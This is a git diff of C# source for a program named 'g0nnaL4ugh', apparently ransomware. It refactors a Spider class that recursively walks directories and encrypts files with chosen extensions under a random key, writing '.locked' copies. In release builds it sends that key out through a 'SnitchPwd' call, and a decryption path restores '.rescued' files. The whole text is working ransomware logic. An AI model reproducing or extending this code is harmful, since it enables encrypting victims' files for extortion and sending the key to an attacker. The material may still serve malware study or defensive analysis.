@@ -1,54 +1,47 @@
 ﻿using System;
 using System.Threading;
-using System.Collections.Generic;
 #if DEBUG
 using System.Diagnostics;
 #endif
 using System.IO;
 using g0nnaL4ugh.Crypto;
-using g0nnaL4ugh.Finder;
 using g0nnaL4ugh.Snitch;
+using System.Security.Cryptography;
 
 namespace g0nnaL4ugh
 {
     public class TaskObject
     {
         private string filePath;
-        private List<Node> db;
-        private byte[] pwd;
-      
-        public TaskObject(string filePath, List<Node> db, byte[] pwd)
+        private byte[] pwd;      
+
+        public TaskObject(string filePath, byte[] pwd)
         {
             this.filePath = filePath;
-            this.db = db;
             this.pwd = pwd;
         }
-      
+
         public string FilePath { get { return this.filePath; } }
-        public List<Node> Db { get { return this.db; } }
         public byte[] Pwd { get { return this.pwd; } }
-	}
-   
-	public class Spider
-	{
-		PathUtil pathUtil;
-        List<Node> nodes;
+    }
+
+    public class Spider
+    {
+        PathUtil pathUtil;
         Encrypter encrypter;
         Decrypter decrypter;
         private byte[] pwd;
-      
-		public Spider(PathUtil pathUtil, Encrypter encrypter)
+
+        public Spider(PathUtil pathUtil, Encrypter encrypter)
         {
-			this.pathUtil = pathUtil;
+            this.pathUtil = pathUtil;
             this.encrypter = encrypter;
-            this.nodes = new List<Node>();
         }
 
-		public Spider(PathUtil pathUtil, Decrypter decrypter, byte[] pwd)
+        public Spider(PathUtil pathUtil, Decrypter decrypter, byte[] pwd)
         {
-			this.pathUtil = pathUtil;
+            this.pathUtil = pathUtil;
             this.decrypter = decrypter;
-            this.nodes = new List<Node>();
             this.pwd = pwd;
         }
 
@@ -62,7 +55,7 @@ namespace g0nnaL4ugh
             return Array.IndexOf(validExtensions, ext) > -1;
         }
 
-		public Boolean IsValidPlainTextExtension(string ext)
+        public Boolean IsValidPlainTextExtension(string ext)
         {
             var validExtensions = new[]
             {
@@ -80,7 +73,7 @@ namespace g0nnaL4ugh
             var i = Array.IndexOf(validExtensions, ext);
             return Array.IndexOf(validExtensions, ext) > -1;
         }
-      
+
         public void Spread()
         {
             /*
@@ -96,20 +89,20 @@ namespace g0nnaL4ugh
                 this.pwd = this.encrypter.GenerateRandomPrivateKey();
                 string password = Utilities.ConvertBytes2B64(this.pwd);
 #if DEBUG
-				Sender.FakeSnitchPwd(password, this.pathUtil, this.encrypter);
+                Sender.FakeSnitchPwd(password, this.pathUtil, this.encrypter);
 #else
-				Sender.SnitchPwd(password,this.pathUtil, this.encrypter);
+                Sender.SnitchPwd(password,this.pathUtil, this.encrypter);
 #endif
             }
-                     
-			foreach (string path in this.pathUtil.Start)
+
+            foreach (string path in this.pathUtil.Start)
             {
 #if DEBUG
                 Stopwatch watch = new Stopwatch();
                 watch.Start();
 #endif
                 // Console.WriteLine("Processing path: " + path);
-                this.ProcessDirectory(path, this.nodes);
+                this.ProcessDirectory(path);
 #if DEBUG
                 Double s = watch.ElapsedMilliseconds / 1000d;
                 Console.WriteLine("Time consumed by ProcessDirectory is: {0:N2}s", s);
@@ -118,99 +111,114 @@ namespace g0nnaL4ugh
             }
         }
 
-        private void ProcessDirectory(string path, List<Node> db)
+        private void ProcessDirectory(string path)
         {
 #if DEBUG
-            Console.WriteLine("Processing dir: " + path);
+        Console.WriteLine("Processing dir: " + path);
 #endif
-            string[] files = Directory.GetFiles(path);
-            string[] childDirectories = Directory.GetDirectories(path);
-         
-            foreach(string filePath in files)
+        string[] files = Directory.GetFiles(path);
+        string[] childDirectories = Directory.GetDirectories(path);
+
+        foreach(string filePath in files)
+        {
+            string ext = Path.GetExtension(filePath);
+            TaskObject taskObject = new TaskObject(filePath, this.pwd);
+            if (this.IsEncryptionMode())
             {
-                string ext = Path.GetExtension(filePath);
-                TaskObject taskObject = new TaskObject(filePath, db, this.pwd);
-                if (this.IsEncryptionMode())
+                if (this.IsValidPlainTextExtension(ext))
                 {
-                    if (this.IsValidPlainTextExtension(ext))
-                    {
-                        var resetEvent = new ManualResetEvent(false);
-                        ThreadPool.QueueUserWorkItem(
+                    var resetEvent = new ManualResetEvent(false);
+                    ThreadPool.QueueUserWorkItem(
                             arg =>
                         {
                             ProcessFile2EncCallback(taskObject);
                             resetEvent.Set();
-                        });
-                        resetEvent.WaitOne();
-                    }
-                }else
-                {
-                    if (this.IsValidCipherTextExtension(ext))
-                    {
-                        var resetEvent = new ManualResetEvent(false);
-                        ThreadPool.QueueUserWorkItem(
-                            arg =>
-                        {
-                            ProcessFile2DecCallback(taskObject);
-                            resetEvent.Set();
-                        });
-                        resetEvent.WaitOne();
-                    }
+                    });
+                    resetEvent.WaitOne();
                 }
             }
-         
-            foreach(string dir in childDirectories)
-                this.ProcessDirectory(dir, db);
+                else
+            {
+                if (this.IsValidCipherTextExtension(ext))
+                {
+                    var resetEvent = new ManualResetEvent(false);
+                    ThreadPool.QueueUserWorkItem(
+                            arg =>
+                    {
+                        ProcessFile2DecCallback(taskObject);
+                        resetEvent.Set();
+                    });
+                    resetEvent.WaitOne();
+                }
+            }
+        }
+
+        foreach (string dir in childDirectories)
+            this.ProcessDirectory(dir);
 
         }
-      
+
         private void ProcessFile2EncCallback(object obj)
         {
             TaskObject taskObject = (TaskObject)obj;
-            List<Node> db = taskObject.Db;
             var filePath = taskObject.FilePath;
             byte[] generatedSalt = this.encrypter.GenerateRandomSalt();
             byte[] bytes2Encrypt = File.ReadAllBytes(filePath);
-            Node node = new Node(NodeType.File, filePath, generatedSalt);
-            db.Add(node);
             byte[] encrypted = this.encrypter.EncryptBytes(
                 bytes2Encrypt, taskObject.Pwd, generatedSalt
             );
 #if DEBUG
             Writter.WriteBytes2File(encrypted, filePath + ".locked");
-            Console.WriteLine("[T: " + Thread.CurrentThread.ManagedThreadId + "] " +
-			                  filePath + " | " + Utilities.ConvertBytes2B64(generatedSalt));
-            Console.WriteLine("Encrypted bytes: " + Utilities.ConvertBytes2B64(encrypted));
+            Console.WriteLine("[T: " + Thread.CurrentThread.ManagedThreadId + 
+			                  "] " + filePath + " | " + 
+			                  Utilities.ConvertBytes2B64(generatedSalt));
+            Console.WriteLine("Encrypted bytes: " + 
+			                  Utilities.ConvertBytes2B64(encrypted));
 #else
-         
-#endif
-		}
-
-        private void ProcessFile2DecCallback(object obj)
-        {
-            TaskObject taskObject = (TaskObject)obj;
-            List<Node> db = taskObject.Db;
-            var filePath = taskObject.FilePath;
-            byte[] bytes2DecryptWSalt = File.ReadAllBytes(filePath);
-            byte[] salt = this.decrypter.ExtractSalt(bytes2DecryptWSalt);
-            byte[] bytes2Decrypt = this.decrypter.ExtractBytes2Dec(bytes2DecryptWSalt);
-            Node node = new Node(NodeType.File, filePath, salt);
-            db.Add(node);
-            byte[] plainText = this.decrypter.DecryptBytes(
-                bytes2Decrypt, taskObject.Pwd, salt
-            );
-#if DEBUG
 
 #endif
         }
 
-            private bool IsEncryptionMode()
+        private void ProcessFile2DecCallback(object obj)
+        {
+            TaskObject taskObject = (TaskObject)obj;
+            var filePath = taskObject.FilePath;
+            byte[] bytes2DecryptWSalt = File.ReadAllBytes(filePath);
+            byte[] salt = this.decrypter.ExtractSalt(bytes2DecryptWSalt);
+            byte[] bytes2Decrypt = this.decrypter.
+			                           ExtractBytes2Dec(bytes2DecryptWSalt);
+
+            try
             {
-                /* 
-                * We difference the mode of operation by asking if
-                * encrypter is not null.
-                */
-                return this.encrypter != null;
+                byte[] plainText = this.decrypter.DecryptBytes(
+                    bytes2Decrypt, taskObject.Pwd, salt
+                );
+#if DEBUG
+                string fileNoExtension =
+					Path.GetFileNameWithoutExtension(filePath);
+                string fileDir = Path.GetDirectoryName(filePath);
+                string rescuedPath = Path.Combine(fileDir, fileNoExtension + 
+				                                  ".rescued");
+                Writter.WriteBytes2File(plainText, rescuedPath);
+#else
+
+#endif
             }
+            catch(CryptographicException)
+            {
+                Console.WriteLine("Process File 2 Decrypt Thread " +
+				                  "Callback Exception");
+                System.Environment.Exit(1);
+            }
+        }
+
+        private bool IsEncryptionMode()
+        {
+            /* 
+            * We difference the mode of operation by asking if
+            * encrypter is not null.
+            */
+            return this.encrypter != null;
+        }
     }
 }
